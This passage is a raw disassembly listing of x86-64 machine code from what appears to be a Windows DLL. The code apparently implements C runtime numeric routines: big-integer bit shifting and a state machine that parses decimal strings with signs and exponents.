   18000d402:	41 23 d4             	and    %r12d,%edx
   18000d405:	03 c2                	add    %edx,%eax
   18000d407:	44 8b d0             	mov    %eax,%r10d
   18000d40a:	41 23 c4             	and    %r12d,%eax
   18000d40d:	2b c2                	sub    %edx,%eax
   18000d40f:	41 c1 fa 05          	sar    $0x5,%r10d
   18000d413:	8b d6                	mov    %esi,%edx
   18000d415:	2b c8                	sub    %eax,%ecx
   18000d417:	4d 63 ea             	movslq %r10d,%r13
   18000d41a:	42 8b 44 ad e8       	mov    -0x18(%rbp,%r13,4),%eax
   18000d41f:	d3 e2                	shl    %cl,%edx
   18000d421:	8b cb                	mov    %ebx,%ecx
   18000d423:	44 8d 04 10          	lea    (%rax,%rdx,1),%r8d
   18000d427:	44 3b c0             	cmp    %eax,%r8d
   18000d42a:	72 05                	jb     0x18000d431
   18000d42c:	44 3b c2             	cmp    %edx,%r8d
   18000d42f:	73 02                	jae    0x18000d433
   18000d431:	8b ce                	mov    %esi,%ecx
   18000d433:	41 8d 42 ff          	lea    -0x1(%r10),%eax
   18000d437:	46 89 44 ad e8       	mov    %r8d,-0x18(%rbp,%r13,4)
   18000d43c:	48 63 d0             	movslq %eax,%rdx
   18000d43f:	85 c0                	test   %eax,%eax
   18000d441:	78 24                	js     0x18000d467
   18000d443:	85 c9                	test   %ecx,%ecx
   18000d445:	74 20                	je     0x18000d467
   18000d447:	8b 44 95 e8          	mov    -0x18(%rbp,%rdx,4),%eax
   18000d44b:	8b cb                	mov    %ebx,%ecx
   18000d44d:	44 8d 40 01          	lea    0x1(%rax),%r8d
   18000d451:	44 3b c0             	cmp    %eax,%r8d
   18000d454:	72 05                	jb     0x18000d45b
   18000d456:	44 3b c6             	cmp    %esi,%r8d
   18000d459:	73 02                	jae    0x18000d45d
   18000d45b:	8b ce                	mov    %esi,%ecx
   18000d45d:	44 89 44 95 e8       	mov    %r8d,-0x18(%rbp,%rdx,4)
   18000d462:	48 2b d6             	sub    %rsi,%rdx
   18000d465:	79 dc                	jns    0x18000d443
   18000d467:	41 8b cb             	mov    %r11d,%ecx
   18000d46a:	41 8b c7             	mov    %r15d,%eax
   18000d46d:	d3 e0                	shl    %cl,%eax
   18000d46f:	49 63 c9             	movslq %r9d,%rcx
   18000d472:	21 44 8d e8          	and    %eax,-0x18(%rbp,%rcx,4)
   18000d476:	41 8d 41 01          	lea    0x1(%r9),%eax
   18000d47a:	48 63 d0             	movslq %eax,%rdx
   18000d47d:	49 3b d6             	cmp    %r14,%rdx
   18000d480:	7d 19                	jge    0x18000d49b
   18000d482:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   18000d486:	4d 8b c6             	mov    %r14,%r8
   18000d489:	4c 2b c2             	sub    %rdx,%r8
   18000d48c:	48 8d 0c 91          	lea    (%rcx,%rdx,4),%rcx
   18000d490:	33 d2                	xor    %edx,%edx
   18000d492:	49 c1 e0 02          	shl    $0x2,%r8
   18000d496:	e8 c5 7d ff ff       	call   0x180005260
   18000d49b:	8b 05 13 d0 00 00    	mov    0xd013(%rip),%eax        # 0x18001a4b4
   18000d4a1:	41 bd 20 00 00 00    	mov    $0x20,%r13d
   18000d4a7:	44 8b cb             	mov    %ebx,%r9d
   18000d4aa:	ff c0                	inc    %eax
   18000d4ac:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   18000d4b0:	99                   	cltd
   18000d4b1:	41 23 d4             	and    %r12d,%edx
   18000d4b4:	03 c2                	add    %edx,%eax
   18000d4b6:	44 8b d0             	mov    %eax,%r10d
   18000d4b9:	41 23 c4             	and    %r12d,%eax
   18000d4bc:	2b c2                	sub    %edx,%eax
   18000d4be:	41 c1 fa 05          	sar    $0x5,%r10d
   18000d4c2:	8b c8                	mov    %eax,%ecx
   18000d4c4:	44 8b d8             	mov    %eax,%r11d
   18000d4c7:	41 d3 e7             	shl    %cl,%r15d
   18000d4ca:	44 2b e8             	sub    %eax,%r13d
   18000d4cd:	41 f7 d7             	not    %r15d
   18000d4d0:	41 8b 00             	mov    (%r8),%eax
   18000d4d3:	41 8b cb             	mov    %r11d,%ecx
   18000d4d6:	8b d0                	mov    %eax,%edx
   18000d4d8:	d3 e8                	shr    %cl,%eax
   18000d4da:	41 8b cd             	mov    %r13d,%ecx
   18000d4dd:	41 0b c1             	or     %r9d,%eax
   18000d4e0:	41 23 d7             	and    %r15d,%edx
   18000d4e3:	44 8b ca             	mov    %edx,%r9d
   18000d4e6:	41 89 00             	mov    %eax,(%r8)
   18000d4e9:	4d 8d 40 04          	lea    0x4(%r8),%r8
   18000d4ed:	41 d3 e1             	shl    %cl,%r9d
   18000d4f0:	4c 2b f6             	sub    %rsi,%r14
   18000d4f3:	75 db                	jne    0x18000d4d0
   18000d4f5:	4d 63 d2             	movslq %r10d,%r10
   18000d4f8:	4c 8b c7             	mov    %rdi,%r8
   18000d4fb:	4d 8b ca             	mov    %r10,%r9
   18000d4fe:	49 f7 d9             	neg    %r9
   18000d501:	4d 3b c2             	cmp    %r10,%r8
   18000d504:	7c 15                	jl     0x18000d51b
   18000d506:	49 8b d0             	mov    %r8,%rdx
   18000d509:	48 c1 e2 02          	shl    $0x2,%rdx
   18000d50d:	4a 8d 04 8a          	lea    (%rdx,%r9,4),%rax
   18000d511:	8b 4c 05 e8          	mov    -0x18(%rbp,%rax,1),%ecx
   18000d515:	89 4c 15 e8          	mov    %ecx,-0x18(%rbp,%rdx,1)
   18000d519:	eb 05                	jmp    0x18000d520
   18000d51b:	42 89 5c 85 e8       	mov    %ebx,-0x18(%rbp,%r8,4)
   18000d520:	4c 2b c6             	sub    %rsi,%r8
   18000d523:	79 dc                	jns    0x18000d501
   18000d525:	44 8b c3             	mov    %ebx,%r8d
   18000d528:	8b df                	mov    %edi,%ebx
   18000d52a:	e9 1b 01 00 00       	jmp    0x18000d64a
   18000d52f:	8b 05 7f cf 00 00    	mov    0xcf7f(%rip),%eax        # 0x18001a4b4
   18000d535:	44 8b 15 6c cf 00 00 	mov    0xcf6c(%rip),%r10d        # 0x18001a4a8
   18000d53c:	41 bd 20 00 00 00    	mov    $0x20,%r13d
   18000d542:	99                   	cltd
   18000d543:	41 23 d4             	and    %r12d,%edx
   18000d546:	03 c2                	add    %edx,%eax
   18000d548:	44 8b d8             	mov    %eax,%r11d
   18000d54b:	41 23 c4             	and    %r12d,%eax
   18000d54e:	2b c2                	sub    %edx,%eax
   18000d550:	41 c1 fb 05          	sar    $0x5,%r11d
   18000d554:	8b c8                	mov    %eax,%ecx
   18000d556:	41 d3 e7             	shl    %cl,%r15d
   18000d559:	41 f7 d7             	not    %r15d
   18000d55c:	41 3b fa             	cmp    %r10d,%edi
   18000d55f:	7c 7a                	jl     0x18000d5db
   18000d561:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   18000d565:	0f ba 6d e8 1f       	btsl   $0x1f,-0x18(%rbp)
   18000d56a:	89 5d f0             	mov    %ebx,-0x10(%rbp)
   18000d56d:	44 2b e8             	sub    %eax,%r13d
   18000d570:	8b f8                	mov    %eax,%edi
   18000d572:	44 8b cb             	mov    %ebx,%r9d
   18000d575:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   18000d579:	41 8b 00             	mov    (%r8),%eax
   18000d57c:	8b cf                	mov    %edi,%ecx
   18000d57e:	41 8b d7             	mov    %r15d,%edx
   18000d581:	23 d0                	and    %eax,%edx
   18000d583:	d3 e8                	shr    %cl,%eax
   18000d585:	41 8b cd             	mov    %r13d,%ecx
   18000d588:	41 0b c1             	or     %r9d,%eax
   18000d58b:	44 8b ca             	mov    %edx,%r9d
   18000d58e:	41 d3 e1             	shl    %cl,%r9d
   18000d591:	41 89 00             	mov    %eax,(%r8)
   18000d594:	4d 8d 40 04          	lea    0x4(%r8),%r8
   18000d598:	4c 2b f6             	sub    %rsi,%r14
   18000d59b:	75 dc                	jne    0x18000d579
   18000d59d:	4d 63 cb             	movslq %r11d,%r9
   18000d5a0:	41 8d 7e 02          	lea    0x2(%r14),%edi
   18000d5a4:	4d 8b c1             	mov    %r9,%r8
   18000d5a7:	49 f7 d8             	neg    %r8
   18000d5aa:	49 3b f9             	cmp    %r9,%rdi
   18000d5ad:	7c 15                	jl     0x18000d5c4
   18000d5af:	48 8b d7             	mov    %rdi,%rdx
   18000d5b2:	48 c1 e2 02          	shl    $0x2,%rdx
   18000d5b6:	4a 8d 04 82          	lea    (%rdx,%r8,4),%rax
   18000d5ba:	8b 4c 05 e8          	mov    -0x18(%rbp,%rax,1),%ecx
   18000d5be:	89 4c 15 e8          	mov    %ecx,-0x18(%rbp,%rdx,1)
   18000d5c2:	eb 04                	jmp    0x18000d5c8
   18000d5c4:	89 5c bd e8          	mov    %ebx,-0x18(%rbp,%rdi,4)
   18000d5c8:	48 2b fe             	sub    %rsi,%rdi
   18000d5cb:	79 dd                	jns    0x18000d5aa
   18000d5cd:	44 8b 05 e8 ce 00 00 	mov    0xcee8(%rip),%r8d        # 0x18001a4bc
   18000d5d4:	8b de                	mov    %esi,%ebx
   18000d5d6:	45 03 c2             	add    %r10d,%r8d
   18000d5d9:	eb 6f                	jmp    0x18000d64a
   18000d5db:	44 8b 05 da ce 00 00 	mov    0xceda(%rip),%r8d        # 0x18001a4bc
   18000d5e2:	0f ba 75 e8 1f       	btrl   $0x1f,-0x18(%rbp)
   18000d5e7:	44 8b d3             	mov    %ebx,%r10d
   18000d5ea:	44 03 c7             	add    %edi,%r8d
   18000d5ed:	8b f8                	mov    %eax,%edi
   18000d5ef:	44 2b e8             	sub    %eax,%r13d
   18000d5f2:	4c 8d 4d e8          	lea    -0x18(%rbp),%r9
   18000d5f6:	41 8b 01             	mov    (%r9),%eax
   18000d5f9:	8b cf                	mov    %edi,%ecx
   18000d5fb:	8b d0                	mov    %eax,%edx
   18000d5fd:	d3 e8                	shr    %cl,%eax
   18000d5ff:	41 8b cd             	mov    %r13d,%ecx
   18000d602:	41 0b c2             	or     %r10d,%eax
   18000d605:	41 23 d7             	and    %r15d,%edx
   18000d608:	44 8b d2             	mov    %edx,%r10d
   18000d60b:	41 89 01             	mov    %eax,(%r9)
   18000d60e:	4d 8d 49 04          	lea    0x4(%r9),%r9
   18000d612:	41 d3 e2             	shl    %cl,%r10d
   18000d615:	4c 2b f6             	sub    %rsi,%r14
   18000d618:	75 dc                	jne    0x18000d5f6
   18000d61a:	4d 63 d3             	movslq %r11d,%r10
   18000d61d:	41 8d 7e 02          	lea    0x2(%r14),%edi
   18000d621:	4d 8b ca             	mov    %r10,%r9
   18000d624:	49 f7 d9             	neg    %r9
   18000d627:	49 3b fa             	cmp    %r10,%rdi
   18000d62a:	7c 15                	jl     0x18000d641
   18000d62c:	48 8b d7             	mov    %rdi,%rdx
   18000d62f:	48 c1 e2 02          	shl    $0x2,%rdx
   18000d633:	4a 8d 04 8a          	lea    (%rdx,%r9,4),%rax
   18000d637:	8b 4c 05 e8          	mov    -0x18(%rbp,%rax,1),%ecx
   18000d63b:	89 4c 15 e8          	mov    %ecx,-0x18(%rbp,%rdx,1)
   18000d63f:	eb 04                	jmp    0x18000d645
   18000d641:	89 5c bd e8          	mov    %ebx,-0x18(%rbp,%rdi,4)
   18000d645:	48 2b fe             	sub    %rsi,%rdi
   18000d648:	79 dd                	jns    0x18000d627
   18000d64a:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
   18000d64e:	44 2b 25 5f ce 00 00 	sub    0xce5f(%rip),%r12d        # 0x18001a4b4
   18000d655:	41 8a cc             	mov    %r12b,%cl
   18000d658:	41 d3 e0             	shl    %cl,%r8d
   18000d65b:	f7 5d c4             	negl   -0x3c(%rbp)
   18000d65e:	1b c0                	sbb    %eax,%eax
   18000d660:	25 00 00 00 80       	and    $0x80000000,%eax
   18000d665:	44 0b c0             	or     %eax,%r8d
   18000d668:	8b 05 4a ce 00 00    	mov    0xce4a(%rip),%eax        # 0x18001a4b8
   18000d66e:	44 0b 45 e8          	or     -0x18(%rbp),%r8d
   18000d672:	83 f8 40             	cmp    $0x40,%eax
   18000d675:	75 0b                	jne    0x18000d682
   18000d677:	8b 45 ec             	mov    -0x14(%rbp),%eax
   18000d67a:	44 89 42 04          	mov    %r8d,0x4(%rdx)
   18000d67e:	89 02                	mov    %eax,(%rdx)
   18000d680:	eb 08                	jmp    0x18000d68a
   18000d682:	83 f8 20             	cmp    $0x20,%eax
   18000d685:	75 03                	jne    0x18000d68a
   18000d687:	44 89 02             	mov    %r8d,(%rdx)
   18000d68a:	8b c3                	mov    %ebx,%eax
   18000d68c:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   18000d690:	48 33 cc             	xor    %rsp,%rcx
   18000d693:	e8 98 7b ff ff       	call   0x180005230
   18000d698:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   18000d69d:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   18000d6a1:	49 8b 73 40          	mov    0x40(%r11),%rsi
   18000d6a5:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   18000d6a9:	49 8b e3             	mov    %r11,%rsp
   18000d6ac:	41 5f                	pop    %r15
   18000d6ae:	41 5e                	pop    %r14
   18000d6b0:	41 5d                	pop    %r13
   18000d6b2:	41 5c                	pop    %r12
   18000d6b4:	5d                   	pop    %rbp
   18000d6b5:	c3                   	ret
   18000d6b6:	cc                   	int3
   18000d6b7:	cc                   	int3
   18000d6b8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   18000d6bd:	55                   	push   %rbp
   18000d6be:	56                   	push   %rsi
   18000d6bf:	57                   	push   %rdi
   18000d6c0:	41 54                	push   %r12
   18000d6c2:	41 55                	push   %r13
   18000d6c4:	41 56                	push   %r14
   18000d6c6:	41 57                	push   %r15
   18000d6c8:	48 8d 6c 24 f9       	lea    -0x7(%rsp),%rbp
   18000d6cd:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   18000d6d4:	48 8b 05 25 b9 00 00 	mov    0xb925(%rip),%rax        # 0x180019000
   18000d6db:	48 33 c4             	xor    %rsp,%rax
   18000d6de:	48 89 45 ff          	mov    %rax,-0x1(%rbp)
   18000d6e2:	4c 8b 75 7f          	mov    0x7f(%rbp),%r14
   18000d6e6:	33 db                	xor    %ebx,%ebx
   18000d6e8:	44 89 4d 93          	mov    %r9d,-0x6d(%rbp)
   18000d6ec:	44 8d 4b 01          	lea    0x1(%rbx),%r9d
   18000d6f0:	48 89 4d a7          	mov    %rcx,-0x59(%rbp)
   18000d6f4:	48 89 55 97          	mov    %rdx,-0x69(%rbp)
   18000d6f8:	4c 8d 55 df          	lea    -0x21(%rbp),%r10
   18000d6fc:	66 89 5d 8f          	mov    %bx,-0x71(%rbp)
   18000d700:	44 8b db             	mov    %ebx,%r11d
   18000d703:	44 89 4d 8b          	mov    %r9d,-0x75(%rbp)
   18000d707:	44 8b fb             	mov    %ebx,%r15d
   18000d70a:	89 5d 87             	mov    %ebx,-0x79(%rbp)
   18000d70d:	44 8b e3             	mov    %ebx,%r12d
   18000d710:	44 8b eb             	mov    %ebx,%r13d
   18000d713:	8b f3                	mov    %ebx,%esi
   18000d715:	8b cb                	mov    %ebx,%ecx
   18000d717:	4d 85 f6             	test   %r14,%r14
   18000d71a:	75 17                	jne    0x18000d733
   18000d71c:	e8 0f 9f ff ff       	call   0x180007630
   18000d721:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000d727:	e8 38 9e ff ff       	call   0x180007564
   18000d72c:	33 c0                	xor    %eax,%eax
   18000d72e:	e9 bf 07 00 00       	jmp    0x18000def2
   18000d733:	49 8b f8             	mov    %r8,%rdi
   18000d736:	41 80 38 20          	cmpb   $0x20,(%r8)
   18000d73a:	77 19                	ja     0x18000d755
   18000d73c:	49 0f be 00          	movsbq (%r8),%rax
   18000d740:	48 ba 00 26 00 00 01 	movabs $0x100002600,%rdx
   18000d747:	00 00 00 
   18000d74a:	48 0f a3 c2          	bt     %rax,%rdx
   18000d74e:	73 05                	jae    0x18000d755
   18000d750:	4d 03 c1             	add    %r9,%r8
   18000d753:	eb e1                	jmp    0x18000d736
   18000d755:	41 8a 10             	mov    (%r8),%dl
   18000d758:	4d 03 c1             	add    %r9,%r8
   18000d75b:	83 f9 05             	cmp    $0x5,%ecx
   18000d75e:	0f 8f 0a 02 00 00    	jg     0x18000d96e
   18000d764:	0f 84 ea 01 00 00    	je     0x18000d954
   18000d76a:	44 8b c9             	mov    %ecx,%r9d
   18000d76d:	85 c9                	test   %ecx,%ecx
   18000d76f:	0f 84 83 01 00 00    	je     0x18000d8f8
   18000d775:	41 ff c9             	dec    %r9d
   18000d778:	0f 84 3a 01 00 00    	je     0x18000d8b8
   18000d77e:	41 ff c9             	dec    %r9d
   18000d781:	0f 84 df 00 00 00    	je     0x18000d866
   18000d787:	41 ff c9             	dec    %r9d
   18000d78a:	0f 84 89 00 00 00    	je     0x18000d819
   18000d790:	41 ff c9             	dec    %r9d
   18000d793:	0f 85 9a 02 00 00    	jne    0x18000da33
   18000d799:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000d79f:	b0 30                	mov    $0x30,%al
   18000d7a1:	45 8b f9             	mov    %r9d,%r15d
   18000d7a4:	44 89 4d 87          	mov    %r9d,-0x79(%rbp)
   18000d7a8:	45 85 db             	test   %r11d,%r11d
   18000d7ab:	75 30                	jne    0x18000d7dd
   18000d7ad:	eb 09                	jmp    0x18000d7b8
   18000d7af:	41 8a 10             	mov    (%r8),%dl
   18000d7b2:	41 2b f1             	sub    %r9d,%esi
   18000d7b5:	4d 03 c1             	add    %r9,%r8
   18000d7b8:	3a d0                	cmp    %al,%dl
   18000d7ba:	74 f3                	je     0x18000d7af
   18000d7bc:	eb 1f                	jmp    0x18000d7dd
   18000d7be:	80 fa 39             	cmp    $0x39,%dl
   18000d7c1:	7f 1e                	jg     0x18000d7e1
   18000d7c3:	41 83 fb 19          	cmp    $0x19,%r11d
   18000d7c7:	73 0e                	jae    0x18000d7d7
   18000d7c9:	2a d0                	sub    %al,%dl
   18000d7cb:	45 03 d9             	add    %r9d,%r11d
   18000d7ce:	41 88 12             	mov    %dl,(%r10)
   18000d7d1:	4d 03 d1             	add    %r9,%r10
   18000d7d4:	41 2b f1             	sub    %r9d,%esi
   18000d7d7:	41 8a 10             	mov    (%r8),%dl
   18000d7da:	4d 03 c1             	add    %r9,%r8
   18000d7dd:	3a d0                	cmp    %al,%dl
   18000d7df:	7d dd                	jge    0x18000d7be
   18000d7e1:	8d 42 d5             	lea    -0x2b(%rdx),%eax
   18000d7e4:	a8 fd                	test   $0xfd,%al
   18000d7e6:	74 24                	je     0x18000d80c
   18000d7e8:	80 fa 43             	cmp    $0x43,%dl
   18000d7eb:	0f 8e 3c 01 00 00    	jle    0x18000d92d
   18000d7f1:	80 fa 45             	cmp    $0x45,%dl
   18000d7f4:	7e 0c                	jle    0x18000d802
   18000d7f6:	80 ea 64             	sub    $0x64,%dl
   18000d7f9:	41 3a d1             	cmp    %r9b,%dl
   18000d7fc:	0f 87 2b 01 00 00    	ja     0x18000d92d
   18000d802:	b9 06 00 00 00       	mov    $0x6,%ecx
   18000d807:	e9 49 ff ff ff       	jmp    0x18000d755
   18000d80c:	4d 2b c1             	sub    %r9,%r8
   18000d80f:	b9 0b 00 00 00       	mov    $0xb,%ecx
   18000d814:	e9 3c ff ff ff       	jmp    0x18000d755
   18000d819:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000d81f:	b0 30                	mov    $0x30,%al
   18000d821:	45 8b f9             	mov    %r9d,%r15d
   18000d824:	eb 21                	jmp    0x18000d847
   18000d826:	80 fa 39             	cmp    $0x39,%dl
   18000d829:	7f 20                	jg     0x18000d84b
   18000d82b:	41 83 fb 19          	cmp    $0x19,%r11d
   18000d82f:	73 0d                	jae    0x18000d83e
   18000d831:	2a d0                	sub    %al,%dl
   18000d833:	45 03 d9             	add    %r9d,%r11d
   18000d836:	41 88 12             	mov    %dl,(%r10)
   18000d839:	4d 03 d1             	add    %r9,%r10
   18000d83c:	eb 03                	jmp    0x18000d841
   18000d83e:	41 03 f1             	add    %r9d,%esi
   18000d841:	41 8a 10             	mov    (%r8),%dl
   18000d844:	4d 03 c1             	add    %r9,%r8
   18000d847:	3a d0                	cmp    %al,%dl
   18000d849:	7d db                	jge    0x18000d826
   18000d84b:	49 8b 06             	mov    (%r14),%rax
   18000d84e:	48 8b 88 f0 00 00 00 	mov    0xf0(%rax),%rcx
   18000d855:	48 8b 01             	mov    (%rcx),%rax
   18000d858:	3a 10                	cmp    (%rax),%dl
   18000d85a:	75 85                	jne    0x18000d7e1
   18000d85c:	b9 04 00 00 00       	mov    $0x4,%ecx
   18000d861:	e9 ef fe ff ff       	jmp    0x18000d755
   18000d866:	8d 42 cf             	lea    -0x31(%rdx),%eax
   18000d869:	3c 08                	cmp    $0x8,%al
   18000d86b:	77 13                	ja     0x18000d880
   18000d86d:	b9 03 00 00 00       	mov    $0x3,%ecx
   18000d872:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000d878:	4d 2b c1             	sub    %r9,%r8
   18000d87b:	e9 d5 fe ff ff       	jmp    0x18000d755
   18000d880:	49 8b 06             	mov    (%r14),%rax
   18000d883:	48 8b 88 f0 00 00 00 	mov    0xf0(%rax),%rcx
   18000d88a:	48 8b 01             	mov    (%rcx),%rax
   18000d88d:	3a 10                	cmp    (%rax),%dl
   18000d88f:	75 10                	jne    0x18000d8a1
   18000d891:	b9 05 00 00 00       	mov    $0x5,%ecx
   18000d896:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000d89c:	e9 b4 fe ff ff       	jmp    0x18000d755
   18000d8a1:	80 fa 30             	cmp    $0x30,%dl
   18000d8a4:	0f 85 f2 01 00 00    	jne    0x18000da9c
   18000d8aa:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000d8b0:	41 8b c9             	mov    %r9d,%ecx
   18000d8b3:	e9 9d fe ff ff       	jmp    0x18000d755
   18000d8b8:	8d 42 cf             	lea    -0x31(%rdx),%eax
   18000d8bb:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000d8c1:	45 8b f9             	mov    %r9d,%r15d
   18000d8c4:	3c 08                	cmp    $0x8,%al
   18000d8c6:	77 06                	ja     0x18000d8ce
   18000d8c8:	41 8d 49 02          	lea    0x2(%r9),%ecx
   18000d8cc:	eb aa                	jmp    0x18000d878
   18000d8ce:	49 8b 06             	mov    (%r14),%rax
   18000d8d1:	48 8b 88 f0 00 00 00 	mov    0xf0(%rax),%rcx
   18000d8d8:	48 8b 01             	mov    (%rcx),%rax
   18000d8db:	3a 10                	cmp    (%rax),%dl
   18000d8dd:	0f 84 79 ff ff ff    	je     0x18000d85c
   18000d8e3:	8d 42 d5             	lea    -0x2b(%rdx),%eax
   18000d8e6:	a8 fd                	test   $0xfd,%al
   18000d8e8:	0f 84 1e ff ff ff    	je     0x18000d80c
   18000d8ee:	80 fa 30             	cmp    $0x30,%dl
   18000d8f1:	74 bd                	je     0x18000d8b0
   18000d8f3:	e9 f0 fe ff ff       	jmp    0x18000d7e8
   18000d8f8:	8d 42 cf             	lea    -0x31(%rdx),%eax
   18000d8fb:	3c 08                	cmp    $0x8,%al
   18000d8fd:	0f 86 6a ff ff ff    	jbe    0x18000d86d
   18000d903:	49 8b 06             	mov    (%r14),%rax
   18000d906:	48 8b 88 f0 00 00 00 	mov    0xf0(%rax),%rcx
   18000d90d:	48 8b 01             	mov    (%rcx),%rax
   18000d910:	3a 10                	cmp    (%rax),%dl
   18000d912:	0f 84 79 ff ff ff    	je     0x18000d891
   18000d918:	80 fa 2b             	cmp    $0x2b,%dl
   18000d91b:	74 29                	je     0x18000d946
   18000d91d:	80 fa 2d             	cmp    $0x2d,%dl
   18000d920:	74 13                	je     0x18000d935
   18000d922:	80 fa 30             	cmp    $0x30,%dl
   18000d925:	74 83                	je     0x18000d8aa
   18000d927:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000d92d:	4d 2b c1             	sub    %r9,%r8
   18000d930:	e9 70 01 00 00       	jmp    0x18000daa5
   18000d935:	b9 02 00 00 00       	mov    $0x2,%ecx
   18000d93a:	c7 45 8f 00 80 00 00 	movl   $0x8000,-0x71(%rbp)
   18000d941:	e9 50 ff ff ff       	jmp    0x18000d896
   18000d946:	b9 02 00 00 00       	mov    $0x2,%ecx
   18000d94b:	66 89 5d 8f          	mov    %bx,-0x71(%rbp)
   18000d94f:	e9 42 ff ff ff       	jmp    0x18000d896
   18000d954:	80 ea 30             	sub    $0x30,%dl
   18000d957:	44 89 4d 87          	mov    %r9d,-0x79(%rbp)
   18000d95b:	80 fa 09             	cmp    $0x9,%dl
   18000d95e:	0f 87 d9 00 00 00    	ja     0x18000da3d
   18000d964:	b9 04 00 00 00       	mov    $0x4,%ecx
   18000d969:	e9 0a ff ff ff       	jmp    0x18000d878
   18000d96e:	44 8b c9             	mov    %ecx,%r9d
   18000d971:	41 83 e9 06          	sub    $0x6,%r9d
   18000d975:	0f 84 9c 00 00 00    	je     0x18000da17
   18000d97b:	41 ff c9             	dec    %r9d
   18000d97e:	74 73                	je     0x18000d9f3
   18000d980:	41 ff c9             	dec    %r9d
   18000d983:	74 42                	je     0x18000d9c7
   18000d985:	41 ff c9             	dec    %r9d
   18000d988:	0f 84 b4 00 00 00    	je     0x18000da42
   18000d98e:	41 83 f9 02          	cmp    $0x2,%r9d
   18000d992:	0f 85 9b 00 00 00    	jne    0x18000da33
   18000d998:	39 5d 77             	cmp    %ebx,0x77(%rbp)
   18000d99b:	74 8a                	je     0x18000d927
   18000d99d:	49 8d 78 ff          	lea    -0x1(%r8),%rdi
   18000d9a1:	80 fa 2b             	cmp    $0x2b,%dl
   18000d9a4:	74 17                	je     0x18000d9bd
   18000d9a6:	80 fa 2d             	cmp    $0x2d,%dl
   18000d9a9:	0f 85 ed 00 00 00    	jne    0x18000da9c
   18000d9af:	83 4d 8b ff          	orl    $0xffffffff,-0x75(%rbp)
   18000d9b3:	b9 07 00 00 00       	mov    $0x7,%ecx
   18000d9b8:	e9 d9 fe ff ff       	jmp    0x18000d896
   18000d9bd:	b9 07 00 00 00       	mov    $0x7,%ecx
   18000d9c2:	e9 cf fe ff ff       	jmp    0x18000d896
   18000d9c7:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000d9cd:	45 8b e1             	mov    %r9d,%r12d
   18000d9d0:	eb 06                	jmp    0x18000d9d8
   18000d9d2:	41 8a 10             	mov    (%r8),%dl
   18000d9d5:	4d 03 c1             	add    %r9,%r8
   18000d9d8:	80 fa 30             	cmp    $0x30,%dl
   18000d9db:	74 f5                	je     0x18000d9d2
   18000d9dd:	80 ea 31             	sub    $0x31,%dl
   18000d9e0:	80 fa 08             	cmp    $0x8,%dl
   18000d9e3:	0f 87 44 ff ff ff    	ja     0x18000d92d
   18000d9e9:	b9 09 00 00 00       	mov    $0x9,%ecx
   18000d9ee:	e9 85 fe ff ff       	jmp    0x18000d878
   18000d9f3:	8d 42 cf             	lea    -0x31(%rdx),%eax
   18000d9f6:	3c 08                	cmp    $0x8,%al
   18000d9f8:	77 0a                	ja     0x18000da04
   18000d9fa:	b9 09 00 00 00       	mov    $0x9,%ecx
   18000d9ff:	e9 6e fe ff ff       	jmp    0x18000d872
   18000da04:	80 fa 30             	cmp    $0x30,%dl
   18000da07:	0f 85 8f 00 00 00    	jne    0x18000da9c
   18000da0d:	b9 08 00 00 00       	mov    $0x8,%ecx
   18000da12:	e9 7f fe ff ff       	jmp    0x18000d896
   18000da17:	8d 42 cf             	lea    -0x31(%rdx),%eax
   18000da1a:	49 8d 78 fe          	lea    -0x2(%r8),%rdi
   18000da1e:	3c 08                	cmp    $0x8,%al
   18000da20:	76 d8                	jbe    0x18000d9fa
   18000da22:	80 fa 2b             	cmp    $0x2b,%dl
   18000da25:	74 07                	je     0x18000da2e
   18000da27:	80 fa 2d             	cmp    $0x2d,%dl
   18000da2a:	74 83                	je     0x18000d9af
   18000da2c:	eb d6                	jmp    0x18000da04
   18000da2e:	b9 07 00 00 00       	mov    $0x7,%ecx
   18000da33:	83 f9 0a             	cmp    $0xa,%ecx
   18000da36:	74 67                	je     0x18000da9f
   18000da38:	e9 59 fe ff ff       	jmp    0x18000d896
   18000da3d:	4c 8b c7             	mov    %rdi,%r8
   18000da40:	eb 63                	jmp    0x18000daa5
   18000da42:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000da48:	40 b7 30             	mov    $0x30,%dil
   18000da4b:	45 8b e1             	mov    %r9d,%r12d
   18000da4e:	eb 24                	jmp    0x18000da74
   18000da50:	80 fa 39             	cmp    $0x39,%dl
   18000da53:	7f 3d                	jg     0x18000da92
   18000da55:	47 8d 6c ad 00       	lea    0x0(%r13,%r13,4),%r13d
   18000da5a:	0f be c2             	movsbl %dl,%eax
   18000da5d:	45 8d 6d e8          	lea    -0x18(%r13),%r13d
   18000da61:	46 8d 2c 68          	lea    (%rax,%r13,2),%r13d
   18000da65:	41 81 fd 50 14 00 00 	cmp    $0x1450,%r13d
   18000da6c:	7f 0d                	jg     0x18000da7b
   18000da6e:	41 8a 10             	mov    (%r8),%dl
   18000da71:	4d 03 c1             	add    %r9,%r8
   18000da74:	40 3a d7             	cmp    %dil,%dl
   18000da77:	7d d7                	jge    0x18000da50
   18000da79:	eb 17                	jmp    0x18000da92
   18000da7b:	41 bd 51 14 00 00    	mov    $0x1451,%r13d
   18000da81:	eb 0f                	jmp    0x18000da92
   18000da83:	80 fa 39             	cmp    $0x39,%dl
   18000da86:	0f 8f a1 fe ff ff    	jg     0x18000d92d
   18000da8c:	41 8a 10             	mov    (%r8),%dl
   18000da8f:	4d 03 c1             	add    %r9,%r8
   18000da92:	40 3a d7             	cmp    %dil,%dl
